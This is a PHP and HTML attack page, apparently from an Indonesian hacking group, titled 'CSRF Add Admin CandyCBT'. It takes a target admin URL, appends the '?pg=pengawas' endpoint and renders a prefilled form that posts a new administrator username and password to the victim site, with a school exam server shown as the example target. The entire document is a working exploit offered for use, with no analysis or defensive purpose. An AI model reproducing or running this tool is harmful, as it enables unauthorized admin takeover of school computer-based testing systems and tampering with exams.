<html>
<head>
<title>[+] CSRF Add Admin CandyCBT [+]</title>
<meta name="viewport" content="width=device-width, initial-scale=1" /> 
<script src="https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@latest/pace-theme-default.min.css">
</head>
<body bgcolor="#1e1e1e" text="white" onload="gadasih()">
<style>
  @import url('https://fonts.googleapis.com/css?family=Staatliches');

textarea {
max-width: 90%;
width: 100%;
height: 150px;
resize: none;
outline: none;
overflow: auto;
background: transparent;
color: #ffffff;
}

button {
  background: transparent;
    font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
}

input {
  background: transparent;
  font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
  max-width: 95%;
}

font {
  font-family: Staatliches;
}

body::-webkit-scrollbar {
  width: 12px;               /* width of the entire scrollbar */
}

body::-webkit-scrollbar-track {
  background: ##1e1e1e;        /* color of the tracking area */
}

body::-webkit-scrollbar-thumb {
  background-color: ##1e1e1e;    /* color of the scroll thumb */
  border: 3px solid gray;  /* creates padding around scroll thumb */
}

.area {
  font-family: Courier;
}
</style>
<body>
<script type="text/javascript">
    function gaskan() {
      var passtu = document.getElementById("pass1").value;
      document.getElementById("pass2").value = passtu;
    }

      function checkadmin() {
    var selectedobj=document.getElementById('admin');

    if(selectedobj.className=='hide'){  //check if classname is hide 
      selectedobj.style.display = "block";
      selectedobj.readOnly=true;
      selectedobj.className ='show';
    }else{
      selectedobj.style.display = "none";
      selectedobj.className ='hide';
 }
}
    function gadasih() {
      var gadasih = document.getElementById("gadasih").innerHTML.split("?pg=pengawas").join("");
      document.getElementById("gadasih").innerHTML = gadasih;
    }
  </script>
<center>
<font face=courier new size=5>CSRF Online</font><br><font size="3">Biasanya Work Untuk CandyCBT Versi 2.8<hr>
<form method="post">
<font face=courier new>Target<br></font> <input type="text" name="url" size="60" height="10" placeholder="http://usbk.smpmodelarriyadh.sch.id/admin/" style="margin: 5px auto; padding-left: 5px;" required><br>
<input type="submit" name="go" value="Lock Target">
</form>
<?php
$ekse = "/?pg=pengawas";
$url = $_POST['url'].$ekse;
$meki = str_replace("//?pg", "/?pg", $url);
$antixss_satu = str_replace("<", "&lt;", $meki);
$antixss_dua = str_replace(">", "&gt", $antixss_satu);
$submit = $_POST['go'];
$random = mt_rand(10000000,99999999);
if($submit) {
  echo '<font>Target : <i><font color="yellow" id="gadasih">'.$antixss_dua.'</font></i>';
    echo '<br><br><form action="'.$antixss_dua.'" method="post" target="_blank">
<font size="3"><input type="text" name="nip" value="'.$random.'" required="true" style="display: none;"/><input type="text" name="nama" value="unknown45kece" required="true" style="display: none;"/>
Username : 
<input type="text" name="username" value="abangkece" required="true" />
<br>
Password :
<input type="text" oninput="gaskan()" id="pass1" name="pass1" value="keceabis" required="true" />
<br>
<input type="text" name="pass2" id="pass2" value="keceabis" required="true" style="display: none;"/>
<br>
<button type="submit" name="submit" onclick="checkadmin()">Add Admin</button>
</form>
';
}
?>
</form>
<center><hr><font size=3>Unknown45 - 2021
</body>
</html>